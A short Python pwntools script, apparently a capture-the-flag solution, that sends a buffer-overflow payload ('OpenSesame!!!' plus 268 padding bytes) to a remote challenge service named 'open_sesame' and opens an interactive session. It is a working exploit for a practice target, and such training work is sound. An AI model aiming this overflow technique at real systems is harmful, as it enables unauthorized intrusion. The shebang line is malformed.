#!usr/bin/env/python3

from pwn import *

context.log_level = "debug"

p = remote("challenge.nahamcon.com",32743)
#p = process("./open_sesame")
payload = b"OpenSesame!!!" + b"A"*268 
print(payload)
p.recvline()
p.recvline()
p.recvline()
p.sendline(payload)
p.interactive()